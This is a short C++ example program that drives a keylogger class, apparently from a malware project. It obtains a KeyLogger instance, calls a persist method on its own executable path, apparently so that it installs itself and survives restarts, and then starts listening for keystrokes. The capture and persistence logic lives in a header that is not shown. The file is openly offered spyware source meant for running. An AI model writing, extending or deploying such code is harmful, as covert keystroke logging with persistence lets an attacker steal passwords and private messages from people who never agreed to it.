/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"


int main(int argc, char *argv[]) {

	KeyLogger* kl = KeyLogger::getInstance();

	kl->persist(argv[0]);

    kl->listen();

    return 0;
}
